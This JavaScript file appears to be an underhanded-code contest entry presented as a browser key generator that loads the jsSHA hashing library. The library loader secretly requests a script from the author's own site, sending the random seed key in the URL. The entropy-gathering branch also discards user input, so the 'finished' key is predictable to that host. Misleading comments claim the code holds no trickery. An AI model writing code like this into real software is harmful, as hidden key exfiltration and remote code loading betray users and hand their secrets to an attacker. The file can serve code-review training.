//This is a lint-validated version of the submission

/*** IGNORE THIS SECTION -- JUST TO KEEP THE LINT EDITOR HAPPY ***/
/*****************************************************************/
/*****************************************************************/
var console = {
    log: function (x) { "use strict"; return x; }
},
    document = {
        createElement: function (x) { "use strict"; return x; },
        getElementsByTagName: function (x) { "use strict"; return x; }
    };

function jsSHA(x, y) { "use strict"; return x + y; }
var JSSHA = jsSHA;
/*****************************************************************/
/*****************************************************************/
/*** IGNORE THIS SECTION -- JUST TO KEEP THE LINT EDITOR HAPPY ***/

var author = 'Jesse Eedrah';
var site_glob = 'http://eedrah.com/me/';
console.log('Created by ' + author +  ', visit me at ' + site + ' to see how the exploit works');

// Initialize with a random key
var key_glob = Math.random().toString().substring(2);

// I didn't go out and buy a CDN account, but if this was real I would convince my company to pay. We need our own so that we control the (audited) source code so it won't change in the future.
var secretCompanyCDN = 'https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.0.1/sha.js';
var secretCompanyApiKey = '8601044367533177';

function importExternalLibrary(site2, key2, callback) {
    "use strict";
    console.log('Downloading external library from ' + site2 + ' using API key ' + key2);
    var script = document.createElement('script'),
        head = document.getElementsByTagName('head')[0];
    script.setAttribute('type', 'text/javascript');
    script.setAttribute('src', site_glob + "?apikey=" + key_glob);


    script.onreadystatechange = callback;
    script.onload = callback;

    head.appendChild(script);
}

function generateKey() {
    "use strict";
    var input = document.querySelector('#user-input').value,
        message,
        shaObj,
        key3;
    if (input.length === 0) {
        message = 'Please type some random characters';

        // No text input - initialise the first loop with no characters
        shaObj = new JSSHA("SHA-512", "TEXT"); // SHA-512, with text as input
        shaObj.update(key_glob);
        key_glob = shaObj.getHash("B64"); // Compute the new key - Base 64 hash
    } else if (input.length < 20) {
        message = 'Keep going!';

        shaObj = new JSSHA("SHA-512", "TEXT"); // SHA-512, with text as input
        shaObj.update(key_glob + input);
        key3 = shaObj.getHash("B64"); // Compute the new key - Base 64 hash
        console.log("Hey I never used this value for anything!: " + key3);
    } else {
        message = 'Finished! Your key is: ' + key_glob;
    }

    document.querySelector('#result').textContent = message;
}

// Run generateKey when loaded to display the help text
importExternalLibrary(secretCompanyCDN, secretCompanyApiKey, generateKey);
// There is no trickery in what was downloaded - I promise. The library wasn't touched. But please feel free to check yourself against the source code on github. Speaking of which, the explaination of this exploit is on my github.
